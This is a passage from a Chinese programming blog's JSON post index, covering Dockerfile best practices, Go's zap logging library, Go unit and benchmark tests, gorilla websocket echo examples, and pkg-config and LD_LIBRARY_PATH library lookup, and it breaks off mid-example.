容器是短暂的，也就是说，你需要可以容易的创建、销毁、配置你的容器。\n\n+ 多数情况，构建镜像的时候是将 Dockerfile 和所需文件放在同一文件夹下。但为了构建性能，我们可以采用 [.dockerignore](https://deepzz.com/post/dockerfile-reference.html#toc_6) 文件来排除文件和目录。\n\n+ 避免安装不必要的包，构建镜像应该尽可能减少复杂性、依赖关系、构建时间及镜像大小。\n\n+ 最小化层数。 Dockerfile的一行(除MAINTAINER外)对应镜像的一层，为使层数足够小，故可以将类似的命令串起来，比如RUN 指令，可以使用&&连接多个指令，如此也只有一层。\n\n+ 排序多行参数，通过字母将参数排序来缓解以后的变化，这将帮你避免重复的包、使列表更容易更新，如：\n\n```dockerfile\nRUN apt-get update && apt-get install -y \\\n  bzr \\\n  cvs \\\n  git \\\n  mercurial \\\n  subversion\n```\n\n<!-- more -->\n\n\n\n### 0. 前言\n\n容器内没有后台服务的概念。容器就是为了主进程而存在的，主进程退出，容器就失去了存在的意义，从而退出，其它辅助进程不是它需要关心的东西。所以CMD 运行可执行程序, 阻塞才可以, 要不然会退出。\n\n\n\n###  1. FROM 仓库\n\n尽可能的使用官方仓库存储的镜像作为基础镜像。官方建议使用 [Debian](https://hub.docker.com/_/debian/)，大小在 150mb 左右。不过在实际开发中，应该用到 [alpine](https://hub.docker.com/_/alpine/) 的次数比较多，因为它仅 5mb 左右。 busybox更只有1M多。\n\n参考: https://blog.csdn.net/bbwangj/article/details/81088231\n\n\n\n### 2. 指令\n\n##### 2.1 COPY 和 ADD 的区别\n\n在大多数情况下使用COPY, 使用ADD的唯一原因就是你有一个压缩文件，你想自动解压到镜像中。\n\n##### 2.2 RUN 和 CMD 的区别\n\n+ RUN命令是创建Docker镜像的步骤，一个Dockerfile中可以有许多个RUN命令。\n+ CMD命令是当Docker镜像被启动后Docker容器将会默认执行的命令。一个Dockerfile中只能有一个CMD命令。通过执行docker run $image other_command启动镜像可以重载CMD命令。\n\n##### 2.3 ENTRYPOINT 和 CMD的区别\n\nThe main purpose of a CMD is to provide defaults for an executing container. These defaults can include an executable, or they can omit the executable, in which case you must specify an ENTRYPOINT instruction as well.\n\n如果docker run没有指定任何的执行命令或者dockerfile里面也没有entrypoint，那么，就会使用cmd指定的默认的执行命令执行。同时也从侧面说明了entrypoint的含义，它才是真正的容器启动以后要执行命令。\n\n+ CMD的用法\n\n  ```\n  The CMD instruction has three forms:\n   \n  CMD [\"executable\",\"param1\",\"param2\"] (exec form, this is the preferred form) //推荐\n  CMD [\"param1\",\"param2\"] (as default parameters to ENTRYPOINT)\n  CMD command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  \n  eg1: CMD [\"/bin/bash\", \"-c\", \"echo 'hello cmd!'\"]\n  eg2: CMD [\"hello cmd!\"]\n\t\t ENTRYPOINT [\"echo\"]\n  eg3: CMD echo \"hello cmd!\"\n  ```\n  \n  \n  \n+ entrypoint的用法\n\n  An ENTRYPOINT allows you to configure a container that will run as an executable.\n\n  ```\n  ENTRYPOINT has two forms:\n  \n  ENTRYPOINT [\"executable\", \"param1\", \"param2\"] (exec form, preferred) //推荐\n  ENTRYPOINT command param1 param2 (shell form)\n  \n  \n  \n  \n  \n  eg1: 如果命令后面有东西，那么后面的全部都会作为entrypoint的参数。如果没有，但是cmd有，那么cmd的全部内容会作为entrypoint的参数, 会输出 hello cmd 的\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT [\"echo\"]\n  \n  \n  \n  \n  eg2: 这个时候是不会输出 hello cmd 的\n  \n  CMD [\"hello cmd!\"]\n  ENTRYPOINT echo\n  ```\n\n+ 覆盖问题\n\n  + cmd 除非默认, 否则轻易被覆盖\n\n  + entrypoint 可以用 --entrypoint 覆盖\n\n  + 所以建议entrypoint固定, cmd 被覆盖, 结合使用, 并且永远使用Exec表示法\n\n\n\n##### 2.9 环境变量写法\n\n```\nENV KS_HAVEN_ADDR=':16097' \\\nKS_HAVEN_QUIC_ADDR=':16097'\n```\n\n\n\n### 3. 构建镜像\n\n在 Dockerfile 文件所在目录执行：    `docker build -t image_name .`\n\n\n\n##### 3.1 构建的上下文\n\n1. c/s架构, 在服务端构建\n2. 服务端要获取文件, 需要把上下文目录打包发过去 (COPY ../package.json /app 或者 COPY /opt/xxxx /app 无法成功, 超出了上下文)\n3. 最好将dockerfile放在空目录下或项目根目录下, 如果没有所需文件,拷贝过来, 避免发送太多文件给引擎\n\n\n\n##### 3.2 镜像 save load\n\n```bash\ndocker images #查看构建的image\n\ndocker save image/test > image_test.tar.gz # save image\n\ndocker load -i image_test.tar.gz # load image\n```\n\n\n\n### 4. 容器操作\n\n\n\n##### 4.1 运行和进入容器\n\n```bash\ndocker run -d -p 16097:16097 -p 15098:15098  image_name # 启动容器\n\ndocker extc -it 容器名字 bash # 进入容器内部\ndocker exec -it 容器ID  sh   # 进入容器内部\n```\n\n\n\n##### 4.2 看容器log\n\n```bash\ndocker logs -f CONTAINER_ID\n\ndocker logs -f --tail=100 CONTAINER_ID\n```\n\n\n\n##### 4.3 容器和宿主拷贝内容\n\n```bash\ndocker cp foo.txt mycontainer:/foo.txt \ndocker cp mycontainer:/foo.txt foo.txt\n```\n\n\n\n##### 4.4 容器访问宿主主机端口\n\n+ https://jingsam.github.io/2018/10/16/host-in-docker.html\n\n\n\n### 5. 参考资料\n\n+ https://blog.csdn.net/wdq347/article/details/78753322 docker之镜像制作\n+ https://deepzz.com/post/dockerfile-best-practices.html  如何写好Dockerfile，Dockerfile最佳实践","tags":["docker"],"categories":["docker"]},{"title":"golang的log库zap的使用","url":"%2Fp%2F5d303099.html","content":"\n\n\n### 0. 前言\n\n日志作为整个代码行为的记录，是程序执行逻辑和异常最直接的反馈。对于整个系统来说，日志是至关重要的组成部分。通过分析日志我们不仅可以发现系统的问题，同时日志中也蕴含了大量有价值可以被挖掘的信息，因此合理地记录日志是十分必要的。\n\n<!-- more -->\n\n### 1. golang log libs\n\n目前golang主流的 log库有\n\n+ https://github.com/uber-go/zap\n+ https://github.com/Sirupsen/logrus\n\nzap 跟 logrus 以及目前主流的 go 语言 log 类似，提倡采用结构化的日志格式，而不是将所有消息放到消息体中，简单来讲，日志有两个概念：字段和消息。字段用来结构化输出错误相关的上下文环境，而消息简明扼要的阐述错误本身。\n\n##### 1.1 log库使用和性能对比\n\n```go\npackage main\n\nimport (\n\t\"encoding/json\"\n\t\"fmt\"\n\t\"log\"\n\t\"math/rand\"\n\t\"time\"\n\n\t\"github.com/golang/glog\"\n\t\"github.com/sirupsen/logrus\"\n\t\"go.uber.org/zap\"\n)\n\ntype dummy struct {\n\tFoo string `json:\"foo\"`\n\tBar string `json:\"bar\"`\n}\n\nconst letterBytes = \"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ\"\nconst (\n\tletterIdxBits = 6                    // 6 bits to represent a letter index\n\tletterIdxMask = 1<<letterIdxBits - 1 // All 1-bits, as many as letterIdxBits\n\tletterIdxMax  = 63 / letterIdxBits   // # of letter indices fitting in 63 bits\n)\n\nfunc RandString(n int) string {\n\tb := make([]byte, n)\n\t// A rand.Int63() generates 63 random bits, enough for letterIdxMax letters!\n\tfor i, cache, remain := n-1, rand.Int63(), letterIdxMax; i >= 0; {\n\t\tif remain == 0 {\n\t\t\tcache, remain = rand.Int63(), letterIdxMax\n\t\t}\n\t\tif idx := int(cache & letterIdxMask); idx < len(letterBytes) {\n\t\t\tb[i] = letterBytes[idx]\n\t\t\ti--\n\t\t}\n\t\tcache >>= letterIdxBits\n\t\tremain--\n\t}\n\treturn string(b)\n}\n\nfunc dummyData() interface{} {\n\treturn dummy{\n\t\tFoo: RandString(12),\n\t\tBar: RandString(16),\n\t}\n}\n\nfunc main() {\n\n\t// logrus\n\tvar x int64 = 0\n\tt := time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tlogrus.WithField(\"Dummy\", dummyData()).Infoln(\"this is a dummy log\")\n\t}\n\tx += time.Since(t).Nanoseconds()\n\n\t// zap\n\tzlogger, _ := zap.NewProduction()\n\tsugar := zlogger.Sugar()\n\tvar y int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tsugar.Infow(\"this is a dummy log\", \"Dummy\", dummyData())\n\t}\n\ty += time.Since(t).Nanoseconds()\n\n\t// stdlog\n\tvar z int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tdummyStr, _ := json.Marshal(dummyData())\n\t\tlog.Printf(\"this is a dummy log: %s\\n\", string(dummyStr))\n\t}\n\tz += time.Since(t).Nanoseconds()\n\n\t// glog\n\tvar w int64 = 0\n\tt = time.Now()\n\tfor i := 0; i < 10000; i++ {\n\t\tglog.Info(\"\\nthis is a dummy log: \", dummyData())\n\t}\n\tw += time.Since(t).Nanoseconds()\n\n\t// print\n\tfmt.Println(\"=====================\")\n\tfmt.Printf(\"Logrus: %5d ns per request \\n\", x/10000)\n\tfmt.Printf(\"Zap:    %5d ns per request \\n\", y/10000)\n\tfmt.Printf(\"StdLog: %5d ns per request \\n\", z/10000)\n\tfmt.Printf(\"Glog:   %5d ns per request \\n\", w/10000)\n}\n\n\n/*\n=====================\nLogrus: 19305 ns per request\nZap:     1095 ns per request\nStdLog:  7137 ns per request\nGlog:   12070 ns per request\n*/\n```\n\n\n\n### 2. zap 使用\n\n+ sugar模式 (牺牲性能为代价,增强可用性)\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tsugar := logger.Sugar()\n\tsugar.Infow(\"failed to fetch URL\",\n\t\t\"url\", url,\n\t\t\"attempt\", 3,\n\t\t\"backoff\", time.Second,\n\t)\n\n\tsugar.Infof(\"Failed to fetch URL: %s\", url)\n}\n\n\n// 注意 infow 和 infof 的调用区别\n\n/*\n{\"level\":\"info\",\"ts\":1566623998.1506088,\"caller\":\"log/main.go:15\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n \n{\"level\":\"info\",\"ts\":1566623998.15073,\"caller\":\"log/main.go:20\",\"msg\":\"Failed to fetch URL: https://www.liuvv.com\"}\n*/\n```\n\n+ logger 模式\n\n```go\nfunc main() {\n\tlogger, _ := zap.NewProduction()\n\tdefer logger.Sync()\n\n\turl := \"https://www.liuvv.com\"\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", url),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n\n\t//logger.Infow() //没有此函数\n\t//logger.Infof() //没有此函数\n}\n\n\n/*\n{\"level\":\"info\",\"ts\":1566624270.4984472,\"caller\":\"log/main.go:14\",\"msg\":\"failed to fetch URL\",\"url\":\"https://www.liuvv.com\",\"attempt\":3,\"backoff\":1}\n*/\n```\n\n\n\n##### 2.1 zap序列化输出\n\n```\nzap.NewDevelopment() //格式化输出\nzap.NewProduction() //json序列化输出\n```\n\n\n\n##### 2.2 输出到文件里\n\n```go\nfunc NewLogger() (*zap.Logger, error) {\n  cfg := zap.NewProductionConfig()\n  cfg.OutputPaths = []string{\n    \"/var/log/myproject/myproject.log\",\n  }\n  return cfg.Build()\n}\n```\n\n\n\n##### 2.3 输入到滚动文件里\n\nLumberjack用于将日志写入滚动文件。zap 不支持文件归档，如果要支持文件按大小或者时间归档，需要使用lumberjack，lumberjack也是zap官方推荐的。https://github.com/natefinch/lumberjack\n\n```go\nfunc main() {\n\t// lumberjack.Logger is already safe for concurrent use, so we don't need to\n\t// lock it.\n\thook := &lumberjack.Logger{\n\t\tFilename:   \"/tmp/foo.log\", // 日志文件路径\n\t\tMaxSize:    500,            // 每个日志文件保存的最大尺寸 单位：M\n\t\tMaxBackups: 3,              // 日志文件最多保存多少个备份\n\t\tMaxAge:     28,             // 文件最多保存多少天\n\t\tCompress:   true,           // 是否压缩\n\t}\n\tcore := zapcore.NewCore(\n\t\tzapcore.NewJSONEncoder(zap.NewProductionEncoderConfig()),                       // 编码器配置\n\t\tzapcore.NewMultiWriteSyncer(zapcore.AddSync(os.Stdout), zapcore.AddSync(hook)), // 打印到控制台和文件\n\t\tzap.InfoLevel, // 日志级别\n\t)\n\n\tlogger := zap.New(core)\n\tlogger.Info(\"failed to fetch URL\",\n\t\tzap.String(\"url\", \"https://www.liuvv.com\"),\n\t\tzap.Int(\"attempt\", 3),\n\t\tzap.Duration(\"backoff\", time.Second),\n\t)\n}\n```\n\n\n\n### 3. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/41991119","tags":["golang"],"categories":["golang"]},{"title":"golang编写测试用例","url":"%2Fp%2F269bf134.html","content":"\n\n\n### 1. Learn Go with tests\n\n当学习一门语言时, 最有效的办法不是每一章的去阅读概念, 而是通过例子探索学习.\n\n如果没有学习过 Go 语言的, 强烈建议通过编写测试学习 Go 语言, 不仅为测试驱动开发打下基础, 还是可以使用 Go 语言编写健壮的、经过良好测试的系统.\n\n强烈推荐: https://github.com/quii/learn-go-with-tests\n\n<!-- more -->\n\n\n\n### 2. Golang Test\n\nGo语言中自带有一个轻量级的测试框架`testing`和自带的`go test`命令来实现单元测试和性能测试，`testing`框架和其他语言中的测试框架类似，你可以基于这个框架写针对相应函数的测试用例，也可以基于该框架写相应的压力测试用例。测试用例有四种形式： \n\n+ TestXxxx(t *testing.T) // 单元测试\n+ TestBenchmarkXxxx(b* testing.B) // 压力测试\n+ Example_Xxx() // 测试控制台输出的例子 \n+ TestMain(m *testing.M) // 测试Main函数\n\n当然我们也可以使用第三方的测试框架, 更加高效的测试我们的代码:\n\nhttps://github.com/stretchr/testify\n\n\n\n###  3. 单元测试\n\n\n+ 需要创建一个名称以 _test.go 结尾的文件，该文件包含 `TestXxx` 函数\n+ `func TestXxx(*testing.T)`   // Xxx 可以是任何字母数字字符串，但是第一个字母不能是小些字母。\n+ 单元测试中，传递给测试函数的参数是 `*testing.T` 类型。\n\n\n\n##### 3.1 单元测试方法\n\n+ 当我们遇到一个断言错误的时候，标识这个测试失败，会使用到：\n\n  ```\n  Fail: 测试失败，测试继续，也就是之后的代码依然会执行\n  FailNow: 测试失败，测试中断\n  ```\n\n+ 当我们只希望打印信息，会用到:\n\n  ```\n  Log: 输出信息\n  Logf: 输出格式化的信息\n  ```\n\n+ 当我们断言失败的时候，不希望标识测试失败，会用到：\n\n  ```\n  Skip: 相当于 Log + SkipNow\n  Skipf: 相当于 Logf + SkipNow\n  SkipNow: 跳过测试，测试中断\n  ```\n\n+ 当我们断言失败的时候，希望标识测试失败，但是测试继续，会用到：\n\n  ```\n  Error: 相当于 Log + Fail\n  Errorf: 相当于 Logf + Fail\n  ```\n\n+ 当我们断言失败的时候，希望标识测试失败，但中断测试，会用到\n\n  ```\n  Fatal: 相当于 Log + FailNow\n  Fatalf: 相当于 Logf + FailNow\n  ```\n\n  \n\n### 4.  压力测试\n\n+ func BenchmarkXxx(*testing.B)  //函数形式\n+ 通过 \"go test\" 命令，加上 `-bench` flag 来执行\n\n```go\nfunc BenchmarkIsPalindrome(b *testing.B) {\n\tfor i := 0; i < b.N; i++ {\n\t\tIsPalindrome(\"A man, a plan, a canal: Panama\")\n\t}\n}\n\n$ go test -bench=.\nPASS\nBenchmarkIsPalindrome-8 1000000                1035 ns/op\nok      gopl.io/ch11/word2      2.179s\n```\n\n结果中基准测试名的数字后缀部分，这里是8，表示运行时对应的GOMAXPROCS的值。\n\n报告显示每次调用IsPalindrome函数花费1.035微秒，是执行1,000,000次的平均时间。\n\n因为基准测试驱动器开始时并不知道每个基准测试函数运行所花的时间，它会尝试在真正运行基准测试前先尝试用较小的N运行测试来估算基准测试函数所需要的时间，然后推断一个较大的时间保证稳定的测量结果。\n\n\n\n### 5. 常用测试用法\n\n##### 5.1 测试单个文件和单个方法\n\n+ 测试单个文件 go test -v  file_test.go\n\n+ 测试单个函数：go test -v file_test.go -test.run TestFunc\n\n##### 5.2 测试goroutine 是否竞争\n\n```\ngo test -race\n```\n\n##### 5. 3 TestMain函数\n\n在测试之前或之后进行额外的设置（setup）或拆卸（teardown), 测试进入的第一个函数\n\n```\nfunc TestMain(m *testing.M)\n```\n\n##### 5.4 测试覆盖率\n\n```\ngo tool cover -html=c.out\n```\n\n\n\n### 6. 参考资料\n\n+ https://github.com/quii/learn-go-with-tests  //非常重要\n+ https://github.com/stretchr/testify\n\n+ https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter09/09.0.html\n\n+ https://studygolang.com/articles/12587\n\n","tags":["golang"],"categories":["golang"]},{"title":"golang的websocket的使用","url":"%2Fp%2Ffae4c74c.html","content":"\n\n\n### 1. 前言\n\n有些场景下，比如交易 K 线，我们需要前端对后端进行轮询来不断获取或者更新资源状态。轮询的问题毫无以为是一种笨重的方式，因为每一次 http 请求除了本身的资源信息传输外还有三次握手以及四次挥手。替代轮询的一种方案是复用一个 http 连接，更准确的复用同一个 tcp 连接。这种方式可以是 http 长连接，也可以是 websocket。\n\n<!-- more -->\n\n##### 1.1. http长连接\n\nhttp 其实不存在长短连接, http协议的长连接和短连接，实质上是tcp协议的长连接和短连接。\n\nhttp会话永远都是：请求响应结束，这里长连接指一次tcp连接可以传递多次的HTTP报文信息。\n\n##### 1.2 websocket\n\nwebsocket协议是基于tcp的一种新的网络协议。它实现了浏览器与服务器全双工(full-duplex)通信——允许服务器主动发送信息给客户端。\nwebsocket通信协议于2011年被IETF定为标准RFC 6455，并被RFC7936所补充规范。\n\n##### 1.3 websocket 和 http 长连接的区别\n\n首先 websocket 和 http 是完全不同的两种协议，虽然底层都是 tcp/ip。http 长连接也是属于 http 协议。\n\nhttp 协议和 websocket 的最大区别就是 http 是基于 request/response 模式，而 websocket 的 client 和 server 端却可以随意发起 data push。\n\n##### 1.4 sse(server-sent events)\n\nsse是 websockct 的一种轻量代替方案，使用 http 协议。sse 规范是 html5 规范的一个组成部分。\n\n严格地说，http无法做到服务器主动推送信息。但是，有一种变通方法，就是服务器向客户端声明，接下来要发送的是流信息（Content-Type: text/event-stream）。\n\n总体来说，websocket 更强大和灵活。因为它是全双工通道，可以双向通信；sse 是单向通道，只能服务器向浏览器发送，因为流信息本质上就是下载。如果浏览器向服务器发送信息，就变成了另一次 http 请求。\n\n\n\n### 2. golang websocket\n\n在golang语言中，目前有两种比较常用的实现方式：一个是golang自带的库，另一个是[gorilla](github.com/gorilla/websocket)，后者功能更加强大。\n\n\n\n##### 2.1 server端\n\n下面server端是一个http 服务器，监听8080端口。当接收到连接请求后，将连接使用的http协议升级为websocket协议。后续通信过程中，使用websocket进行通信。\n\n对每个连接，server端等待读取数据，读到数据后，打印数据，然后，将数据又发送给client\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/http\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nvar upgrader = websocket.Upgrader{} // use default options\n\nfunc echo(w http.ResponseWriter, r *http.Request) {\n\tc, err := upgrader.Upgrade(w, r, nil)\n\tif err != nil {\n\t\tlog.Print(\"upgrade:\", err)\n\t\treturn\n\t}\n\tdefer c.Close()\n\tfor {\n\t\tmt, message, err := c.ReadMessage()\n\t\tif err != nil {\n\t\t\tlog.Println(\"read:\", err)\n\t\t\tbreak\n\t\t}\n\t\tlog.Printf(\"server recv: %s\", message)\n\t\terr = c.WriteMessage(mt, message)\n\t\tif err != nil {\n\t\t\tlog.Println(\"write:\", err)\n\t\t\tbreak\n\t\t}\n\t}\n}\n\nfunc main() {\n\tflag.Parse()\n\thttp.HandleFunc(\"/echo\", echo)\n\tlog.Fatal(http.ListenAndServe(*addr, nil))\n}\n```\n\n\n\n##### 2.2 client端\n\nclient启动后，首先连接server。连接建立后，主routine每一秒钟向server发送消息(当前时间)。另一个routine从server接收数据,并打印。\n\n当client退出时，会向server发送关闭消息。接着，等待退出。\n\n```go\npackage main\n\nimport (\n\t\"flag\"\n\t\"log\"\n\t\"net/url\"\n\t\"os\"\n\t\"os/signal\"\n\t\"time\"\n\n\t\"github.com/gorilla/websocket\"\n)\n\nvar addr = flag.String(\"addr\", \"localhost:8080\", \"http service address\")\n\nfunc main() {\n\tflag.Parse()\n\tlog.SetFlags(0)\n\n\tinterrupt := make(chan os.Signal, 1)\n\tsignal.Notify(interrupt, os.Interrupt)\n\n\tu := url.URL{Scheme: \"ws\", Host: *addr, Path: \"/echo\"}\n\tlog.Printf(\"connecting to %s\", u.String())\n\n\tc, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n\tif err != nil {\n\t\tlog.Fatal(\"dial:\", err)\n\t}\n\tdefer c.Close()\n\n\tdone := make(chan struct{})\n\n\tgo func() {\n\t\tdefer close(done)\n\t\tfor {\n\t\t\t_, message, err := c.ReadMessage()\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"read:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tlog.Printf(\"client recv: %s\", message)\n\t\t}\n\t}()\n\n\tticker := time.NewTicker(time.Second)\n\tdefer ticker.Stop()\n\n\tfor {\n\t\tselect {\n\t\tcase <-done:\n\t\t\treturn\n\t\tcase t := <-ticker.C:\n\t\t\terr := c.WriteMessage(websocket.TextMessage, []byte(t.String()))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\tcase <-interrupt:\n\t\t\tlog.Println(\"interrupt\")\n\n\t\t\t// Cleanly close the connection by sending a close message and then\n\t\t\t// waiting (with timeout) for the server to close the connection.\n\t\t\terr := c.WriteMessage(websocket.CloseMessage, websocket.FormatCloseMessage(websocket.CloseNormalClosure, \"\"))\n\t\t\tif err != nil {\n\t\t\t\tlog.Println(\"write close:\", err)\n\t\t\t\treturn\n\t\t\t}\n\t\t\tselect {\n\t\t\tcase <-done:\n\t\t\tcase <-time.After(time.Second):\n\t\t\t}\n\t\t\treturn\n\t\t}\n\t}\n}\n```\n\n\n\n![1](golang_websocket/1.png)\n\n\n\n### 3. 总结\n\n##### 服务器:\n\n+ var upgrader = websocket.Upgrader{}\n+ c, err := upgrader.Upgrade(w, r, nil)\n+ for循环里 c.ReadMessage()  和 c.WriteMessage(mt, message)\n\n##### 客户端:\n\n+ c, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n+ for循环里 c.ReadMessage()  和 c.WriteMessage(mt, message)\n\n\n\n### 4. 参考资料\n\n+ https://zhuanlan.zhihu.com/p/35167916\n+ https://www.jianshu.com/p/3fc3646fad80","tags":["websocket"],"categories":["golang"]},{"title":"动态库查找路径及LD_LIBRARY_PATH问题","url":"%2Fp%2F17c0913d.html","content":"\n说到和动态库查找路径相关的问题，总体上可以分为两类：\n\n+ 第一类：通过源代码编译程序时出现的找不到某个依赖包的问题\n+ 第二类：就是在运行程序的时候，明明把那个程序需要的依赖包都已经安装的妥妥的了，可运行的时候人家就告诉你说`error while loading shared libraries: libxxx.so.y: cannot open shared object file: No such file or directory`。\n\n<!-- more -->\n\n###    1. 源代码安装程序找不到依赖库\n\n通过源码包安装程序时，主要用到了“三大步”策略：configure、make和make install 。出问题最多的就是在configure阶段，很多初学者由于不知道configure的那么多参数该怎么用，所以往往为了省事，一句简单的“./configure”下去，百分之八九十都能成功，可问题往往就出在剩下的百分之十几上面了。\n\n\n\n在安装的configure阶段，为了检测安装安装环境是否满足，通常情况下都是通过一个叫做`pkg-config`的工具来检测它需要依赖的动态库是否存在，这个工具我们在上一篇博文已经认识过了。pkg-config通常情况都是位于/usr/bin目录下，是个可执行程序。在configure阶段，通常都会用pkg-config来判断所依赖的动态库是否存在。现在问题就是，这个工具是如何判断的呢？它的依据是什么？当这两个问题弄明白了，真相也就大白了。\n\n\n\n 一般当我们安装完某个程序后，如果它提供了动态库的功能，在源码中都会有一个或多个以pc结尾的文件，当执行完make install后这些pc文件拷贝到${prefix}/lib/pkgconfig这个目录里，这里的prefix就是我们在configure阶段时通过配置参数--prefix指定的，缺省情况这个值就是/usr/local，所以这些pc文件最终会被拷贝到/usr/local/lib/pkgconfig目录下。可能有人会问，这些pc文件有啥用呢？我们随便打开一个来瞅瞅：\n\n```shell\n\n[root@localhost ~]# cat /usr/local/lib/pkgconfig/librtmp.pc\nprefix=/usr/local\nexec_prefix=${prefix}\nlibdir=${exec_prefix}/lib\nincdir=${prefix}/include\n\n\nName: librtmp\nDescription: RTMP implementation\nVersion: v2.3\nRequires: libssl,libcrypto\nURL: http://rtmpdump.mplayerhq.hu\nLibs: -L${libdir} -lrtmp -lz\nCflags: -I${incdir}\n```\n\n跟我们configure阶段相关的主要集中在Libs和Cflags两项上面，如果你此时再执行下面这两条命令，就全明白了：\n\n```shell\n[root@localhost ~]# pkg-config --cflags librtmp\n-I/usr/local/include\n[root@localhost ~]# pkg-config --libs librtmp\n-L/usr/local/lib -lrtmp -lz -lssl -lcrypto\n```\n\n也就是说，pkg-config把我们以前需要在Makefile里指定编译和链接时所需要用到的参数从手工硬编码的模式变成了自动完成，节约了多少跨平台移植的兼容性问题。\n\n\n\n##### 1.1 安装了找不到依赖库的原因\n\n假如说，如果我们将要的编译的软件包依赖librtmp这个动态库，那么此时在我系统上这个检测就算通过了。当然这只是第一步，检测过了不一定兼容，这里我们只讨论能不能找到依赖库的问题。好了，如果说找不到某个库该怎么办。前提是你确确实实已经安装了它需要的库，不用多想，原因只有一个，pkg-config找不到这个与这个库对应的pc文件。\n\n为什么会找不到呢，原因又有两点：\n\n1、pkg-config搜索了所有它认为合适的目录都没找着这个库对应的pc文件的下落；\n\n2、这个库在发布时根本就没有提供它的pc文件。\n\n> 那么pkg-config的查找路径是哪里？\n\npkg-config较老的版本里，缺省情况下会到/usr/lib/pkgconfig、/usr/loca/lib/pkgconfig、/usr/share/pkgconfig等目录下去搜索pc文件，据我所知在0.23以及之后的版本里pkg-config的源码里已经没有关于缺省搜索路径的任何硬编码的成分了，取而代之的是，当你看pkg-config的man手册时会有下面一段话：\n\n```\npkg-config retrieves information about packages from special metadata files. These files are  named  after the  package,  with  the extension .pc.\nBy default, pkg-config looks in the directory ___prefix___/lib/pkgconfig for these files; it will also look in the colon-separated (on Windows, semicolon-separated) list of directories specified by the PKG_CONFIG_PATH environment variable.\n\n\n\nPKG_CONFIG_PATH\n    A colon-separated (on Windows, semicolon-separated) list of directories to search  for  .pc  files. The  default directory will always be searched after searching the path; the default is ___libdir___/pkg-config:___datadir___/pkgconfig where libdir is the libdir where pkg-config and  datadir  is  the  datadir where pkg-config was installed.\n```\n\n\n\n  上面的prefix、libdir和datadir，就是安装pkg-config时被设定好的，具体情况是：\n\n+ 如果你是通过yum和rpm包安装的\n\n  ```bash\n  prefix=/usr\n  libdir=${prefix}/lib=/usr/lib\n  datadir=${prefix}/share=/usr/share\n  ```\n\n+ 如果你是通过源码包安装的，且没有指定prefix的值\n\n  ```bash\n  prefix=/usr/local\n  libdir=${prefix}/lib=/usr/local/lib\n  datadir=${prefix}/share=/usr/local/share \n  ```\n\n\n\npkg-config在查找对应软件包的信息时的缺省搜索路径已经很清楚了，就是是`${libdir}/pkgconfig`和`${datadir}/pkgconfig`。如果你软件包对应的pc文件都不在这两个目录下时，pkg-config肯定找不到。既然原因都已经找到了，那解决办法也就多种多样了。\n\n\n\n##### 1.2 解决找不到库的问题(PKG_CONFIG_PATH)\n\n+ 我们可以在安装我们那个被依赖的软件包时，在configure阶段用--prefix参数把安装目录指定到/usr目录下；\n\n+ 也可以按照上面说的，通过一个名叫`PKG_CONFIG_PATH`的环境变量来向pkg-config指明我们自己的pc文件所在的路径，不过要注意的是`PKG_CONFIG_PATH`所指定的路径优先级比较高，pkg-config会先进行搜索，完了之后才是去搜索缺省路径。\n\n前者的优点是以后再通过源码安装软件时少了不少麻烦，缺点是用户自己的软件包和系统软件混到一起不方便管理，所以实际使用中，后者用的要多一些。如下:\n\n```bash\nexport PKG_CONFIG_PATH=/your/local/path:$PKG_CONFIG_PATH\n```\n\n  然后，在configure时就绝对没问题了。\n\n\n\n### 2. 程序运行时出现libxxx.so.y => not found\n\n##### 2.1 ldd 查看依赖的动态库\n\n用`ldd 可执行程序名`可以查看一个软件启动时所依赖的动态库，如果输出项有“libxxx.so.y=> not found”一项，你这个软件100%运行不起来。我们来做个试验：\n\n```bash\n[root@localhost ~]# echo $LD_LIBRARY_PATH    //嘛也没有\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => /usr/local/lib/libmp3lame.so.0 (0x0088c000)\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x00573000)\n........\n```\n\n\n\n我的系统里没有设置`LD_LIBRARY_PATH`环境变量，现在我们把其中的一个库`libmp3lame.so.0`从`/usr/loca/lib`下移动到/opt目录里，并执行ldconfig，让`libmp3lame.so.0`彻底从`/etc/ld.so.cache`里面消失。其实`libmp3lame.so.0`只是`libmp3lame.so.0.0.0`的一个符号链接，我们真正需要移动的是后者.\n\n完了之后再执行ldd /usr/local/bin/ffmpeg时结果如下：\n\n```bash\n[root@localhost ~]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found    //果然Not found 了\nlibfaac.so.0 => /usr/local/lib/libfaac.so.0 (0x004a4000)\n........\n\n[root@localhost ~]# ffmpeg --help\nffmpeg: error while loading shared libraries: libmp3lame.so.0: cannot open shared object file: No such file or directory  //此时ffmpeg当然运行不起来\n```\n\n   \n\n##### 2.2 LD_LIBRARY_PATH \n\n我们来试试LD_LIBRARY_PATH，看看好使不：\n\n```bash\n[root@localhost opt]# export LD_LIBRARY_PATH=/opt:$LD_LIBRARY_PATH\n[root@localhost opt]# ldd /usr/local/bin/ffmpeg\n........\nlibmp3lame.so.0 => not found           